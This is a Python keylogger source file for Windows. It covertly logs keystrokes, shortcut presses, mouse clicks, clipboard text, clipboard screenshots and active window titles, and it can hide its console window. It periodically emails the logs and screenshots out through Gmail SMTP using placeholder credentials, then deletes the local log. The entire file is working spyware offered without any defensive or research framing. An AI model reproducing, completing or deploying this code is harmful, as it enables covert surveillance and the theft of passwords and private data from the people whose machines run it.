import win32clipboard
import win32ui
import win32file
import win32gui
import win32con
import time
import datetime
import smtplib
import configparser
import keyboard
from PIL import ImageGrab
from pynput.keyboard import Listener as KeyListener
from pynput.mouse import Listener as MouseListener
from email.message import EmailMessage
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

# Listen for keyboard input and print it in log.txt file
def read_keyboard_input(key):

    for hotkey in hotkey_list:
        if keyboard.is_pressed(hotkey):
            with open("log.txt", "a") as log:
                log.write("[Shortcut press: " + hotkey + "] ")

    try:
        with open("log.txt", "a") as log:
            log.write(key.char)

    except AttributeError:

        with open("log.txt", "a") as log:
            log.write(" " + str(key).replace("Key.", "") + " ")
    except:
        return


# Listen for mouse input (clicks) and print it in log.txt file
def read_mouse_click(x, y, button, pressed):
    with open("log.txt", "a") as log:
        if pressed:
            log.write(
                " ["
                + str(button).replace(".", "").lower()
                + " press at {0}".format((x, y))
                + "] "
            )
        else:
            log.write(
                " ["
                + str(button).replace(".", "").lower()
                + " release at {0}".format((x, y))
                + "] "
            )


# Listen for mouse input (scrolls) and print it in log.txt file
def read_mouse_scroll(x, y, dx, dy):
    with open("log.txt", "a") as log:
        log.write(" [Scroll")
        if dy == -1:
            log.write("down] ")
        elif dy == 1:
            log.write("up] ")


# Get copied text stored in clipboard and print it in log.txt file
def get_clipboard_text(clipboard_current, log):

    global clipboard_previous

    try:
        win32clipboard.OpenClipboard()
    except:
        return

    # If clipboard content is screenshot
    try:
        clipboard_current = win32clipboard.GetClipboardData()
    except TypeError:
        get_clipboard_screenshot(screenshot_current)
        return

    if clipboard_current != clipboard_previous:
        with open("log.txt", "a") as log:
            log.write(" [Current clipboard content: " + clipboard_current + "] ")

    win32clipboard.CloseClipboard()
    clipboard_previous = clipboard_current


# Get screenshot stored in clipboard and save it as screenshot.png
def get_clipboard_screenshot(screenshot_current):

    global screenshot_previous

    screenshot = ImageGrab.grabclipboard()
    screenshot.save("screenshot.png")

    screenshot_current = win32clipboard.GetClipboardSequenceNumber()

    if screenshot_current != screenshot_previous:
        send_screenshot()

    screenshot_previous = screenshot_current


# Get currently opened tab and print it in log.txt file
def get_opened_tab(window_current, log):

    global window_previous

    try:
        PyCWnd = win32ui.GetForegroundWindow()
        window_current = PyCWnd.GetWindowText()

        if window_current != window_previous:
            with open("log.txt", "a") as log:
                log.write(" [Currently opened tab: ")
                log.write(window_current + "] ")

        window_previous = window_current
    except:
        return


# Send log.txt file to given email address
def send_logs(log_content):
    message = EmailMessage()
    message["Subject"] = "Log"
    # Set desired address/login and password:
    message["From"] = "email address"
    message["To"] = "email address"
    message.set_content(log_content)

    with open("log.txt", "r") as log:
        message.add_attachment(log.read(), filename="log.txt")

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        # Set desired address/login and password:
        smtp.login("email address", "password")
        smtp.send_message(message)


# Send each new screenshot.png file to given email address
def send_screenshot():
    message = MIMEMultipart()
    message["Subject"] = "Screenshot"
    # Set desired address/login and password:
    message["From"] = "email address"
    message["To"] = "email address"

    with open("screenshot.png", "rb") as f:
        img_data = f.read()

    image = MIMEImage(img_data, name="screenshot.png")
    message.attach(image)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        # Set desired address/login and password:
        smtp.login("email address", "password")
        smtp.send_message(message)


if __name__ == "__main__":

    # Read basic settings from config.ini file
    try:
        config = configparser.ConfigParser()
        config.read("config.ini")
        config.options("Configuration")
        hide_window = config.getboolean("Configuration", "hide_window")
        log_file_capacity = config.getint("Configuration", "log_file_capacity")
    except FileNotFoundError:
        # Default settings
        log_file_capacity = 5000
        hide_window = False

    now = datetime.datetime.now()

    clipboard_current = ""
    clipboard_previous = ""
    window_current = ""
    window_previous = ""
    screenshot_current = 0
    screenshot_previous = 0

    # List of the most common "ctrl + letter" hotkeys
    hotkey_list = [
        "ctrl + x",
        "ctrl + z",
        "ctrl + c",
        "ctrl + v",
        "ctrl + e",
        "ctrl + d",
        "ctrl + a",
        "ctrl + r",
        "ctrl + f",
        "ctrl + n",
        "ctrl + w",
    ]

    # Creating log.txt file to log all informations
    try:
        log = open("log.txt", "x")
        with open("log.txt", "a") as log:
            log.write(
                now.strftime("[Log creation date and time: %Y-%m-%d %H:%M:%S]\n\n")
            )
    except FileExistsError:
        log = open("log.txt", "a")

    mouse_listener = MouseListener(
        on_click=read_mouse_click, on_scroll=read_mouse_scroll
    )
    mouse_listener.start()
    key_listener = KeyListener(on_press=read_keyboard_input)
    key_listener.start()

    # Hiding console window if hide_window in config.ini is set to True
    if hide_window == True:
        hide = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hide, win32con.SW_HIDE)

    while True:

        now = datetime.datetime.now()

        # Send new log file every log_file_capacity characters
        with open("log.txt", "r") as log:
            if len(log.read()) >= log_file_capacity:

                with open("log.txt", "a") as log_footer:
                    log_footer.write(
                        now.strftime(
                            "\n\n[Log sending date and time: %Y-%m-%d %H:%M:%S]"
                        )
                    )

                send_logs("log.txt")
                log.close()
                win32file.DeleteFile("log.txt")
                log = open("log.txt", "x")

                with open("log.txt", "a") as log:
                    log.write(
                        now.strftime(
                            "[Log creation date and time: %Y-%m-%d %H:%M:%S]\n\n"
                        )
                    )

        get_opened_tab(window_current, log)
        get_clipboard_text(clipboard_current, log)
        time.sleep(2)
